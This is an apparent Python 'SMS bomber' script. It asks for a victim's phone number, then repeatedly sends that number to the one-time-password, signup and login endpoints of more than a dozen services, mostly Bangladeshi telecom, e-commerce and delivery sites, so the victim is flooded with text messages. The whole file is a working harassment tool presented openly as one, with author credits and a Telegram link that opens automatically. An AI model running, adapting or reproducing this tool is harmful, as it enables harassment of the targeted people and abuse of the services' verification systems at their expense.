

import os,sys,time

clear='clear';tool='Unlimited_SMS_Bomber';gift='Open_Gift';on=9;lim=0
coder='꧁༒Ѧɮɖʊͥʟͣʟͫǟђ࿐ˣᵞᴸᴼᴺ';team='꧁༒Ѧɮɖʊͥʟͣʟͫǟђ࿐ˣᵞᴸᴼᴺ';git='Xylon';tg='https://t.me/Abdullha_404'
credit={"Tool": tool, "Coded_By": coder, "Telegram": team, "GitHub": git, "Script": gift};go='xdg-open '
r='\033[1;31m';g='\033[1;32m';y='\033[1;33m';running='[bold purple]SMS [bold yellow]Boombing [bold green]Started...'
try:
    import requests,rich
except ImportError:
    os.system('pip install requests')
    os.system('pip install rich')
import requests,rich,json,string
from rich import print as lmnx9
from rich import print_json as json
def lmnx9_banner():
    os.system(clear)
    os.system(go+tg)
    json(data=credit)
    lmnx9(47*f'[bold cyan]-'+'[bold white]')
def DARK_TEAM_LMNx9():
    lmnx9_banner()
    num=input(f"{g}[{r}+{g}] {y}VICTIM NUMBER {g}: ")
    lmnx9(47*f'[cyan]-'+'[bold white]')
    lmnx9_banner()
    lmnx9("[blue][[red]>[blue]][bold red] LMNx9 [bold yellow]Unlimited "+running)
    lmnx9(47*f'[bold cyan]-'+'[bold white]')
    lmnx9("[red][[bold tan]![red]][bold red] YOUR VICTIM [bold green]: "+num)
    lmnx9(47*f'[bold cyan]-'+'[bold white]')
    lmnx9("[purple][[green]✘[purple]][bold violet] FOR STOP - [bold green]CTRL+Z")
    while lim<on:
        try:
            requests.get("https://web-api.binge.buzz/api/v3/otp/send/+88"+num)
            lmnx1={"msisdn": ""+num}
            requests.post("https://weblogin.grameenphone.com/backend/api/v1/otp", params=lmnx1)
            requests.get("http://bomber.ezyro.com/index.php?number="+num)
            lmnx2={"company_name":"Hello","email_address":"uladhosen860@gmail.com","phone_number":num,"full_name":"limon hossain"}
            requests.post("https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", params=lmnx2)
            requests.get("https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile="+num)
            requests.get("https://cms.beta.praavahealth.com/api/v2/user/login/?mobile="+num)
            lmnx3={"whatsappConsent":True,"requestType":"send","emailConsent":True,"phoneNumber":num}
            requests.post("https://prod-api.viewlift.com/identity/signup?site=hoichoitv", params=lmnx3)
            lmnx4={"emailOrPhone":num}
            requests.post("https://api.paragonfood.com.bd/auth/customerlogin", params=lmnx4)
            requests.get("https://ultranetrn.com.br/fonts/api.php?number="+num)
            lmnx5={"phone":num}
            requests.post("https://api.swap.com.bd/api/v1/send-otp", params=lmnx5)
            requests.get("https://bikroy.com/data/phone_number_login/verifications/phone_login?phone="+num)
            lmnx6={"type":1.0,"mobile":"+88"+num}
            requests.post("https://ecom.rangs.com.bd/send-otp-code", params=lmnx6)
        except:
            time.sleep(5)
            lmnx9(10*f'\n[bold red]->'+'[bold white]')
            lmnx9("[red][[tan]✘[red]] [bold red]REQUEST TIME OUT ERROR ! ")
            lmnx9(47*f'[bold cyan]-'+'[bold white]')
            input(f"{g}[{r}>{g}] {y}PRESS ENTER TO BACK ")
            DARK_TEAM_LMNx9()
        continue
if __name__ in '__main__':
    DARK_TEAM_LMNx9()
else:sys.exit()
    